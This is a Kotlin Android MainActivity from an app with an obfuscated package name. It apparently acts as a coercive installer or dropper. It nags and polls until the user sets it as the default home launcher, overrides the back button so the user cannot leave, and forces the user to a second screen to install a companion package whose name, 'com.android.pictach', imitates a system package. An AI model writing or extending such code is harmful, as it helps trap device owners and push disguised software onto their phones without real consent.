package com.cristal.bristral.tristal.mistral

import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var homeRunnable: Runnable

    companion object {
        var isUninstalling = false
        private const val COMPANION_PKG = "com.android.pictach"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        goToDefaultHome()
    }

    override fun onResume() {
        super.onResume()
        if (isUninstalling) {
            isUninstalling = false
            return
        }
        if (isDefaultHome()) {
            // If companion not installed — force to SecondActivity to install
            if (!isCompanionInstalled()) {
                goToSecondActivity()
                return
            }
            goToSecondActivity()
        } else {
            goToDefaultHome()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }

    // Block back button — force install if companion not installed
    override fun onBackPressed() {
        if (!isCompanionInstalled()) {
            goToSecondActivity()
        } else {
            if (isDefaultHome()) {
                goToSecondActivity()
            } else {
                goToDefaultHome()
            }
        }
    }

    private fun goToDefaultHome() {
        if (isDefaultHome()) {
            goToSecondActivity()
            return
        }
        Toast.makeText(
            this,
            "Please set this app as your default home launcher",
            Toast.LENGTH_LONG
        ).show()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val intent = Intent("android.settings.HOME_SETTINGS")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                val intent = Intent("android.settings.APPLICATION_DETAILS_SETTINGS")
                intent.data = Uri.parse("package:$packageName")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
        } catch (e: Exception) {
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
        homeRunnable = Runnable {
            if (isDefaultHome()) {
                goToSecondActivity()
            } else {
                handler.postDelayed(homeRunnable, 1000)
            }
        }
        handler.postDelayed(homeRunnable, 1000)
    }

    private fun isDefaultHome(): Boolean {
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        val info = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
            ?: return false
        return info.activityInfo?.packageName == packageName
    }

    private fun isCompanionInstalled(): Boolean {
        return try {
            packageManager.getPackageInfo(COMPANION_PKG, 0)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun goToSecondActivity() {
        handler.removeCallbacksAndMessages(null)
        val intent = Intent(this, SecondActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }
}
